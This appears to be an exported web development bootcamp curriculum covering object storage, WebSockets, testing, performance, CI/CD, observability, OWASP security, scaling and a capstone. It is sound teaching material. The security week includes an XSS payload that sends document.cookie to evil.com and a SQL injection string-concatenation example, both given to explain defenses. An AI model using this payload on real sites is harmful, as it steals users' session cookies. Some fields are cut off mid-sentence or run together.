weeks.title: File Uploads, Object Storage, and CDNs
weeks.context:
Storing files is not the same as storing data. Database rows are structured and indexed, they are designed for queries. Files are binary blobs that can be gigabytes. Storing them in your database (as BLOBs) works at small scale and is a mess at large scale. The standard architecture: store files in object storage, store the file metadata (URL, size, type, owner) in your database.

Object storage is the category. S3 is Amazon's implementation and the industry standard for the API. Every major cloud has an S3-compatible service: Cloudflare R2 (no egress fees, good choice for most apps), Backblaze B2, DigitalOcean Spaces, Google Cloud Storage. They all implement the same API. The Cloudflare R2 SDK is the AWS SDK with a different endpoint URL, the client code is identical.

Presigned URLs are the right way to handle uploads in a web application. The naive approach: browser uploads file to your server, your server uploads to S3. Problems: your server handles the bandwidth and compute cost, your server is in the critical path, large files can time out. The correct approach: browser asks your server for a presigned URL (a time-limited signed URL that allows a specific upload action), your server generates the presigned URL using the SDK, the browser uploads directly to S3 using that URL, your server is not in the upload path. Your server only handles metadata.

Image optimisation. Next.js has a built-in Image component that handles optimisation, it serves images in WebP or AVIF format (smaller than JPEG/PNG), resizes images to the displayed size (no serving a 2000px image in a 200px container), and lazy loads images below the fold. For user-uploaded images, you typically process them on the server after upload: resize to a maximum dimension, convert to WebP, generate thumbnail variants. Libraries: sharp (fast, native Node module).

Content Delivery Networks cache your static assets at edge locations close to your users. Without a CDN, every user downloads the original file from your single origin server, regardless of geography. With a CDN, the first request to each edge location fetches from origin and caches; subsequent requests are served from the edge, much faster for global audiences. Cloudflare R2 includes CDN functionality. AWS CloudFront sits in front of S3.

This week: add avatar upload to Bean Forge user profiles and menu item image upload to the admin panel using presigned URLs and Cloudflare R2.

Step 1: the browser asks your server for a presigned URL, sending the filename and content type. weeks.title: WebSockets and Real-time, When HTTP Isn't Enough
weeks.context:
HTTP is a request-response protocol: the client sends a request, the server sends a response, the connection is done. This model is fine for loading pages and submitting forms. It breaks down when you need the server to push data to connected clients, a live chat message, a real-time dashboard update, a collaborative editing change. For these use cases, you need WebSockets.

A WebSocket is a persistent, bidirectional connection between client and server. It starts as an HTTP connection (the handshake happens over HTTP), then upgrades to the WebSocket protocol. Once upgraded, both sides can send messages to each other at any time without the overhead of a new HTTP connection for each message. The connection stays open until either side closes it.

Socket.IO is the standard Node.js library for WebSockets. It wraps the WebSocket protocol with useful features: automatic reconnection when the connection drops, fallback to long-polling in environments that do not support WebSockets, rooms (named channels where you can broadcast to a subset of connected clients), and namespaces. The server emits events and clients listen for them; clients emit events and the server listens. The programming model is event-driven.

Scaling WebSockets is harder than scaling HTTP. HTTP servers are stateless, any server can handle any request. WebSocket connections are stateful, a connected client is connected to a specific server instance. If you have two server instances and clients connect to both, an event emitted on server 1 is not automatically sent to clients connected to server 2. The solution is an adapter: Socket.IO has a Redis adapter that routes messages between server instances via Redis pub/sub. In development with one server, this does not matter. In production, plan for it.

Server-Sent Events (SSE) are a simpler alternative for one-way server-to-client updates. SSE is a standard HTTP connection that the server keeps open and writes event data to periodically. The client uses the EventSource API. SSE is simpler than WebSockets (no library required, works over HTTP/2), but only supports server-to-client communication. For dashboards, notifications, and activity feeds, SSE is often the better choice.

items.body: A user is watching their order on the /orders/:id page. The admin updates the order status to "ready". How does the update reach the user's browser? The admin sends a PATCH /orders/:id request to your server. The server updates the database. Then the server calls io.to(`order:${orderId}`).emit('orderUpdated', { status: 'ready' }). The user's browser, when it loaded the order page, ran socket.join(`order:${orderId}`) (via a socket.emit to the server asking to join that room). The server called socket.join on their behalf. Now when the server emits to that room, the user's browser receives the event and updates the UI without a page reload.

weeks.title: Testing, Unit, Integration, E2E
weeks.context:
Testing is how you change code without being afraid. An untested codebase is one where every change might break something that worked before, and the only way to know is to manually click through every feature after every change. Tests make refactoring possible, make onboarding new developers faster, and make sleeping better.

Three types of tests, from fastest to slowest and from cheapest to most expensive. Unit tests verify a single function in isolation. They mock all dependencies. They run in milliseconds. Write them for pure business logic: price calculations, data transformations, validation functions. Unit tests cannot tell you that the system works end-to-end. Integration tests verify that multiple units work together, your API route calling the database, your authentication middleware rejecting unauthorised requests. They use a real (or in-memory) database. They run in seconds. Write them for your API endpoints. They give the most confidence per test written. End-to-end (E2E) tests run a real browser and simulate user interactions. They test the full stack: frontend, backend, database. They run in minutes. Write them for critical user journeys: sign up, login, place an order, subscribe.

Vitest is the test runner for modern TypeScript projects (faster than Jest, better TypeScript support, same API). Supertest is a library for testing Express HTTP endpoints without starting a real server. Playwright is the standard for E2E browser testing.

Testing culture: tests are not just for finding bugs after the fact. Writing the test first (TDD) forces you to think about the interface before the implementation, it often leads to better-designed functions. At minimum, write tests before you fix bugs (the test proves the bug exists, then the fix makes it pass, and the test ensures the bug never comes back).

This week you write unit tests for the pricing logic in Bean Forge, integration tests for the auth and orders API endpoints using a test database, and E2E tests for the signup and checkout flows using Playwright.

items.title: Prove you understood it
items.body: You have a function calculateOrderTotal(items, discountCode) that applies a discount if the code is valid. How do you unit test this? You do not need a database or a server, create test cases with plain JavaScript objects. Test the happy path: valid items and a valid discount code returns the correct total. Test edge cases: empty items array returns 0, invalid discount code is ignored (or throws, depending on your design), items with 0 quantity are excluded, negative prices are rejected. Each test creates the input, calls the function, and asserts the output. No mocking required, the function takes plain data in and returns plain data out.

weeks.title: Performance, Web Vitals and Bundle Size
weeks.context:
Performance is user experience. A page that takes 5 seconds to load loses users before they see the product. Core Web Vitals are Google's performance metrics and a ranking signal for search. The three that matter: Largest Contentful Paint (LCP), how fast the main content appears; Cumulative Layout Shift (CLS), how much the page jumps around while loading; Interaction to Next Paint (INP), how fast the page responds to user interactions.

LCP targets: under 2.5 seconds is good, 2.5-4.0 seconds needs improvement, over 4.0 seconds is poor. The LCP element is usually the hero image or the main heading. Optimise it by: preloading the LCP image (link rel="preload"), serving images in WebP or AVIF format, using a CDN so the image is served from an edge location close to the user, and using the Next.js Image component which does all of this.

Bundle size is the other major performance lever. Every kilobyte of JavaScript downloaded, parsed, and executed delays interactivity. Your users on slow connections pay for every unused import. Measure bundle size with next build (it shows route bundle sizes) and the next-bundle-analyzer package. Common problems: importing an entire utility library when you only need one function (import { format } from 'date-fns' is fine; import _ from 'lodash' pulls in 70KB), not code-splitting large components (dynamic imports load them lazily), shipping polyfills for browsers you do not support.

Server components in Next.js App Router are a performance win: they render on the server and ship zero JavaScript to the browser. Use server components for anything that does not require interactivity (fetching data, static content). Move interactivity down to leaf components that can be marked 'use client'. This "islands architecture" minimises client-side JavaScript.

Caching is the most impactful optimisation. Next.js caches at multiple levels: build-time static generation (fastest), route-level caching with revalidate, and request memoization. Understand which cache is active for each page and when it is invalidated. Database query caching: use Redis or a query-level cache for expensive queries that do not need to be real-time. HTTP caching: set Cache-Control headers correctly so browsers and CDNs cache static assets.

items.title: Real-user monitoring
items.body:
## Real-user monitoring

Performance is user experience. A page that takes 5 seconds to load loses users before they see the product. Core Web Vitals are Google's performance metrics and a ranking signal for search. The three that matter: Largest Contentful Paint (LCP), how fast the main content appears; Cumulative Layout Shift (CLS), how much the page jumps around while loading; Interaction to Next Paint (INP), how fast the page responds to user interactions.

LCP targets: under 2.5 seconds is good, 2.5-4.0 seconds 

## Key ideas
- Understand the concept before reaching for code.
- Build the smallest working example first.
- Commit early and often so each step is reversible.

items.title: Prove you understood it
items.body: Your LCP score is 4.2 seconds. The LCP element is the hero image on the homepage. What specific changes do you make to fix it? Convert the image to WebP (50-80% smaller than JPEG). Add a preload link in the head: <link rel="preload" as="image" href="/hero.webp">. weeks.title: CI/CD and Deploy, Shipping on Every Merge
weeks.context:
Continuous Integration and Continuous Deployment (CI/CD) is the practice of automatically running tests and deploying code on every change. The goal: changes go from your editor to users in production with confidence, in minutes, without manual steps. This week you set up the pipeline that will govern every future change to Bean Forge.

CI (Continuous Integration): every push to the repository triggers an automated pipeline that installs dependencies, runs linting, runs the type checker, runs the test suite, and builds the application. If any of these fail, the pipeline fails and the change is blocked from merging. The point is that you find out within 5 minutes of pushing whether your change is broken, not 2 days later when someone complains.

CD (Continuous Deployment): after CI passes on the main branch, the pipeline automatically deploys to production. For staging environments, deploy on every merge to main. For production, some teams add a manual approval step. With Vercel or Railway, deployment is a single command or a git push, these platforms handle building and serving.

GitHub Actions is the standard CI system for GitHub repositories. A workflow is a YAML file in .github/workflows/ that defines jobs (groups of steps) triggered by events (push, pull_request, schedule). Each job runs on a fresh virtual machine (runner). Steps are shell commands or pre-built actions from the Actions Marketplace.

Environments and secrets: production credentials (DATABASE_URL, STRIPE_SECRET_KEY, etc.) must not be in your code. GitHub Actions provides encrypted secrets that you set in the repository settings and reference in workflows as ${{ secrets.SECRET_NAME }}. Set up separate secrets for staging and production environments.

Preview deployments: Vercel and Railway can deploy every pull request to a unique preview URL. This means stakeholders can review changes on a live URL before they merge to main. Each preview has its own environment variables (connected to the staging database, not production).

items.title: Zero-cost path (free alternatives)
items.body:
## Zero-cost path (no credit card required)

This week mentions industry-standard tools that can cost money. You can complete every step for free, with no card and no trial that auto-renews:

- **AWS**, use **LocalStack** (mocks AWS APIs on your laptop) plus **MinIO** (local S3). The CLI commands are the same; set `--endpoint-url=http://localhost:4566`. No AWS account or card required.
- **Google Cloud / BigQuery**, use **DuckDB** (local, the same SQL, blazing fast) or local **Postgres**. No GCP account needed.
- **Azure**, substitute **LocalStack** / local tooling; the concepts transfer directly.
- **Hosting**, **Vercel Hobby** is free with no card; Netlify's free tier and GitHub Pages also work.
- **Error tracking**, self-host **GlitchTip** (free) or use Sentry's free developer tier (no card).
- **Payments**, use **Stripe test mode**: test API keys are free and need no business or card.

Learn the concept with the free tool; the paid service is only how some teams run it in production. The skills and the code are the same.

weeks.title: Observability, Logs, Metrics, Traces in Production
weeks.context:
Production is different from your laptop. On your laptop, you know when something breaks because you are watching the terminal. In production, users run into bugs while you are asleep, and unless you have instrumented your application, you find out from a support email two days later. Observability is the practice of making your system's internal state visible from its external outputs.

Three pillars of observability. Logs are timestamped records of events: a user logged in, an order was placed, an error occurred. Structured logs (JSON format) are machine-readable and can be queried. Unstructured logs (plain text sentences) are human-readable but hard to search at scale. Use structured logging. Metrics are numeric measurements aggregated over time: requests per second, error rate, database query latency, memory usage. They tell you the system is unhealthy. Logs tell you why. Traces are end-to-end records of a request as it flows through multiple services. They show you which part of a distributed system is slow.

Error tracking is the highest-ROI observability investment for a single-service application. Sentry captures unhandled exceptions, attaches the stack trace, the user's session, the browser/OS, and groups duplicate errors together. Without Sentry, a bug that affects 1000 users generates 1000 separate error reports (or none, if users just leave without reporting). With Sentry, it is one issue with a count of 1000.

Uptime monitoring checks your application from the outside at regular intervals and alerts you if it is down. Services like Better Uptime, UptimeRobot, or Checkly ping your health check endpoint every minute. Your health check endpoint should verify the database connection and any critical dependencies, not just return 200.

Logging in Node.js: use Pino (fast, structured JSON logging) or Winston. In development, pretty-print with human-readable format. In production, output raw JSON so log aggregation services (Datadog, Logtail, Papertrail) can parse it.

items.body: Your health check endpoint at /api/health returns 200. An uptime monitor pings it and reports your site is up. But users are getting "Internal Server Error" on checkout. How does this happen and how do you fix it? The health check only checked the HTTP server, not the database connection. weeks.title: Security, The Threats You Haven't Thought About
weeks.context:
Security is not a checklist. Every application that handles user data or money has the same set of threats, and most breaches happen because of well-known, well-documented vulnerabilities that were not addressed. This week you learn the OWASP Top 10 and how each applies to Bean Forge.

SQL injection: user-controlled input is included directly in SQL queries, allowing the attacker to modify the query. Parameterised queries (which Prisma uses by default) prevent this entirely, the parameter value is never interpreted as SQL. The vulnerability is using raw string concatenation: db.query("SELECT * FROM users WHERE email = '" + email + "'"). Prisma's ORM layer means you are safe if you use the API correctly. Watch for prisma.$queryRaw, use template literal syntax where Prisma escapes the parameters, not string concatenation.

Cross-Site Scripting (XSS): an attacker injects malicious JavaScript into a page that other users view. In React, JSX automatically escapes text content, {userInput} is safe. The vulnerability is dangerouslySetInnerHTML or using the DOM API to set innerHTML directly. Never use dangerouslySetInnerHTML with user-supplied content unless you run it through a sanitisation library like DOMPurify first.

Cross-Site Request Forgery (CSRF): a malicious website tricks a user's browser into making authenticated requests to your application. Modern defences: SameSite=Strict or SameSite=Lax cookie attribute prevents the browser from including cookies on cross-site requests. The SameSite attribute is now the default in most browsers, making CSRF rare. Still, understand the attack.

Dependency vulnerabilities: your application is only as secure as its dependencies. Run npm audit regularly. Use automated tools (Dependabot, Snyk) to flag known CVEs in your dependency tree. Subscribe to security advisories for your major dependencies.

Security headers: a small middleware call that adds significant protection. Use the helmet package in Express: it sets Content-Security-Policy, X-Frame-Options (prevents clickjacking), Strict-Transport-Security (forces HTTPS), and other headers. In Next.js, configure security headers in next.config.ts.

Rate limiting: prevents brute-force attacks (trying millions of passwords), credential stuffing (using leaked credentials from other breaches), and scraping. Add rate limiting to authentication endpoints and any expensive endpoint.

Environment variables and secrets: never commit secrets to git. Use .env files locally (excluded via .gitignore) and environment variable management in production (Vercel env, Railway env, AWS Secrets Manager).

items.title: Prove you understood it
items.body: A user can set their display name. It is shown to other users on their profile page. Explain how a stored XSS attack would work and how React protects you. The attack: a malicious user sets their display name to <script>document.location='https://evil.com?cookie='+document.cookie</script>. If this string is rendered as HTML in another user's browser, the script executes and steals their cookies. React's protection: JSX escapes HTML entities before inserting into the DOM. The malicious name is rendered as the literal text "<script>...", the browser sees a string, not a script tag. This protection applies when you use {user.displayName}. It does not apply if you use dangerouslySetInnerHTML={{__html: user.displayName}}, never do that with user content.

weeks.title: Scaling, When 10x More Traffic Hits
weeks.context:
Most applications never need to scale to millions of users. But understanding scaling teaches you how databases, networks, and servers actually work, knowledge that makes you a better developer even for small applications. And if your application does grow, you should know the sequence of bottlenecks you will hit and how to address each.

The first scaling bottleneck is almost always the database. Databases handle reads and writes; reads are much more common (in a typical web app, 90%+ of requests are reads). The first tool: read replicas. You keep one primary database that handles writes. You create one or more replicas (copies that stay in sync with the primary) and route read queries to them. This multiplies your read capacity. With Prisma, you configure a datasource for the read replica and use it for read-only queries.

Database indexing is the highest-ROI performance optimisation in most applications. Without an index, every query scans every row in the table. An index is a data structure (usually a B-tree) that the database maintains separately, allowing lookups in O(log n) instead of O(n). Add indexes to columns you filter or sort by frequently. Check slow queries with EXPLAIN ANALYZE in PostgreSQL, queries with "Seq Scan" on large tables usually need an index. The cost: indexes take disk space and slow down writes slightly (the index must be updated on every write). Do not add indexes speculatively, add them when you have evidence of a slow query.

Horizontal scaling: running multiple instances of your application server behind a load balancer. Stateless applications (no in-memory state, sessions stored in the database or Redis) scale horizontally without issues, any instance can handle any request. Stateful concerns (WebSocket connections, in-memory caches) do not scale horizontally without coordination (Redis adapter for Socket.IO, shared Redis cache).

Caching: serving responses from memory instead of recalculating them. Redis is the standard in-memory data store for caching. Cache database query results for data that does not change often. Cache rendered HTML for pages that are the same for all users. Cache external API responses. Always define a TTL (time to live), stale data is usually better than slow responses, up to a point.

CDN for static assets: images, JavaScript bundles, CSS. Already covered in W18, but at scale, this removes significant load from your servers.

items.title: Prove you understood it
items.body: You have a query that fetches all orders for a user: SELECT * FROM orders WHERE userId = $1 ORDER BY createdAt DESC. The orders table has 2 million rows. This query takes 3 seconds. What do you do? Run EXPLAIN ANALYZE, it will show a sequential scan with cost estimated at thousands. Add an index: CREATE INDEX idx_orders_userid ON orders(userId). PostgreSQL can now jump directly to the rows for that userId. For the ORDER BY, a composite index on (userId, createdAt DESC) is even better, the database gets the results in order without a sort step. After adding the index, EXPLAIN ANALYZE should show an "Index Scan" and the query should take milliseconds.

weeks.title: Polish, The Last 5% That Takes 50% of the Time
weeks.context:
The last 5% of polish is what users notice most. A technically correct application that has rough edges, janky animations, confusing error states, unclear loading feedback, inconsistent spacing, feels unfinished. Users make judgments about quality from these details, not from the underlying code. This week you go through Bean Forge with a fine-tooth comb and fix everything that makes it feel like a side project instead of a product.

Accessibility: your application must work for users who navigate with a keyboard, use a screen reader, or have colour vision deficiencies. Keyboard navigation: every interactive element (buttons, links, form fields, modals) must be reachable and operable with Tab, Enter, and Escape. Focus indicators must be visible (do not remove the outline without replacing it). Modal dialogs must trap focus inside them when open. Screen readers: use semantic HTML (nav, main, section, button, not div for everything). Add ARIA labels where the visual context is not available to screen readers (icon buttons need aria-label). Colour contrast: text must have at least 4.5:1 contrast ratio against its background (WCAG AA). Test with the WebAIM Contrast Checker.

Error states: every form submission, every data fetch, every user action can fail. Design and implement the error states explicitly. An error message must tell the user what went wrong and what they can do about it. "An error occurred" is not an error message. "Your card was declined, please try a different payment method" is.

Empty states: when a list has no items, show a helpful empty state that explains why and what the user can do. The orders page for a new user with no orders should not show a blank white space, it should explain that there are no orders yet and link to the menu.

Loading states: use skeletons (placeholder shapes) instead of spinners for content that has a known layout. A skeleton shows the layout while data loads, preventing layout shift and looking more professional than a spinner in the middle of the page.

Micro-interactions: small animations that give feedback. A button that compresses slightly when pressed. A form field that shakes when validation fails. A toast that slides in from the corner. These are 1-2 hours of work that make the application feel alive. Use Framer Motion or CSS transitions.

When the modal opens, focus must move to the first focusable element inside the modal (or the modal itself if it has tabIndex={0}). While the modal is open, Tab should cycle through focusable elements inside the modal only, focus must not escape to elements behind the modal. When the modal closes (Escape key or close button), focus must return to the button that opened it. This is focus trapping. Use the focus-trap-react library or implement it manually with a ref and a keydown listener.

weeks.title: Capstone, Ship a SaaS, Real Users, Real Revenue
weeks.context:
This is the week you stop building features and start shipping a product. Bean Forge has evolved from a static HTML page to a full-stack SaaS with authentication, payments, real-time updates, file uploads, and email. Week 24 is not about adding anything, it is about making everything you have built solid, documented, and ready for real users.

A real SaaS needs a public landing page, pricing page, and blog. It needs a production monitoring setup (Sentry, uptime monitoring, structured logs). It needs a runbook: a document that describes what to do when something breaks in production. It needs a privacy policy and terms of service (real legal documents, use a template generator like Termly or the EFF's model privacy policy, then have a lawyer review before you have real users). It needs an onboarding flow: what happens between a user signing up and them getting value from the product?

The capstone project: you will ship Bean Forge as a real, publicly accessible SaaS. Set a goal of 10 real users (not test accounts, not friends being polite, users who actually use the product). To get 10 users, you need to distribute it: post in relevant communities (Reddit communities for coffee shop owners, Product Hunt, Twitter/X, local business groups), reach out directly to small coffee shop owners, or write a blog post about building it. The constraint of real users forces every previous lesson into sharp focus: performance matters because users on slow connections will leave; security matters because real data is at stake; reliability matters because users expect the product to be there.

The capstone project for this track is not a toy. It is something you can put in your portfolio, link in job applications, and point to when asked to demonstrate full-stack experience. The code is on GitHub (public, with a clean README), the application is live on a real domain, and it has at least one paying subscriber (even if it is you, to prove the payment flow works end-to-end).

items.title: Set up your tooling
items.body:
## What it is
Production stack check (Next.js, Prisma, Stripe, Sentry, Vercel) is the foundation for this week's work. Without it installed and working, every later day will fail with a cryptic error.

## What you'll do today
- Install the required tool(s)
- Authenticate (if the tool talks to a cloud or remote service)
- Run a one-line verification command
- Commit a `day0` checkpoint to GitHub

## Why before anything else
The #1 reason mentees stall is a missing CLI, a wrong PATH, or unauthenticated credentials. Spend 30 minutes here and save hours later.

items.title: See it in action - the exact steps
items.body:
## Walkthrough
Do every step now, in your terminal.

```bash
npm install -g vercel
vercel --version
```

## What 'working' looks like
Vercel CLI prints its version.

If anything errors, read the message carefully - 90% of Day 0 failures are PATH or auth issues, both of which the error spells out.

## Context
This applies specifically to week 24 ('Capstone, Ship a SaaS, Real Users, Real Revenue'), day 0.

items.title: Zero-cost path (free alternatives)
items.body:
## Zero-cost path (no credit card required)

This week mentions industry-standard tools that can cost money. You can complete every step for free, with no card and no trial that auto-renews:

- **Error tracking**, self-host **GlitchTip** (free) or use Sentry's free developer tier (no card).
- **Payments**, use **Stripe test mode**: test API keys are free and need no business or card.

Learn the concept with the free tool; the paid service is only how some teams run it in production. The skills and the code are the same.

items.title: Prove you understood it
items.body: You have 10 users. One of them emails you at 2am saying "I can't log in." What is your process? Step 1: check your uptime monitor, is the site down? Step 2: check Sentry, is there an unhandled exception in the auth flow? Step 3: check your structured logs for login attempts from that user's email, did the attempt reach the server? What was the response? Step 4: try logging in yourself, does it work for you? Step 5: if you cannot reproduce it, ask the user for their browser, device, and any error message they saw. Step 6: if the site is down, follow your runbook for the incident type. If you can reproduce the bug, write a failing test first, then fix it.
